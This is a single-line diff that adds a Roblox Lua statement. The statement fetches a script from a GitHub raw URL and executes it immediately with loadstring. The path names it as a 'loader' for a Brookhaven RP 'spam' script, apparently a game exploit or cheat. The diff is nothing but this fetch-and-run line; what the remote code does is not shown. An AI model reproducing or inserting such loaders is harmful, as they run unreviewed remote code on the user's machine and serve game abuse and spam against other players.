@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/brookhaven-rp-spam2-edzgjnj4ikcymc.lua"))()
